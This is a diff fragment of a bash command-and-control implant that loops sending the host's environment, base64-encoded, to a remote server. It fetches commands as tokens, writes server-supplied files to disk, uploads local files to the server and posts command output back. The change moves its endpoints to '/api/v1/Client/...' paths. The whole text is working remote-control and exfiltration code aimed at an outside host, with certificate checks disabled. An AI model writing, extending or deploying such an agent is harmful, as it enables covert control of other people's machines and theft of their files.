@@ -54,8 +54,8 @@ while true; do
   fi
   
   env=$(GetEnv) ; getenv64=$(R64Encoder -t "$env")
-  request1=$(curl -A "$cagent" -s -k -X POST "$server/api/info" -d "Info: $getenv64\n\n")
-  response=$(curl -A "$cagent" -s -k "$server/api/token")
+  request1=$(curl -A "$cagent" -s -k -X POST "$server/api/v1/Client/Info" -d "Info: $getenv64")
+  response=$(curl -A "$cagent" -s -k "$server/api/v1/Client/Token")
   token=$(echo "$response" | grep "Token: " | cut -d ' ' -f2)
   invoke64=$(R64Decoder -t "$token") ; param="Debug"
 
@@ -67,7 +67,7 @@ while true; do
       if [[ $invoke64 == upload* ]]; then
          file_path="${invoke64#upload }"
          file_path=$(echo $file_path | cut -d "!" -f 2)
-         file_request=$(curl -A "$cagent" -s -k -X GET "$server/api/download")
+         file_request=$(curl -A "$cagent" -s -k -X GET "$server/api/v1/Client/Download")
          file_content=$(echo "$file_request" | grep "File: " | cut -d ' ' -f2)
          R64Decoder -t "$file_content" > "$file_path"
          continue
@@ -77,7 +77,7 @@ while true; do
          file_path="${invoke64#download }"
          file_path=$(echo $file_path | cut -d "!" -f 1)
          file_content=$(R64Encoder -f "$file_path")
-         download=$(curl -A "$cagent" -s -k -X POST "$server/api/upload" -d "File: $file_content\n\n")
+         download=$(curl -A "$cagent" -s -k -X POST "$server/api/v1/Client/Upload" -d "File: $file_content")
          continue
       fi
 
@@ -103,13 +103,8 @@ while true; do
          fi
       fi
 
-      output64=$(R64Encoder -t "$commandx")
-      path=$(echo "$param" | tr "[:upper:]" "[:lower:]")
+      output64=$(R64Encoder -t "$commandx") ; path=$(echo "$param")
+      request2=$(curl -A "$cagent" -s -k -X POST "$server/api/v1/Client/$path" -d "$param: $output64")
 
-      if [ "$param" == "Error" ]; then
-         request2=$(curl -A "$cagent" -s -k -X POST "$server/api/error" -d "error: $output64\n\n")
-      else
-         request2=$(curl -A "$cagent" -s -k -X POST "$server/api/$path" -d "$param: $output64\n\n")
-      fi
    fi
 done
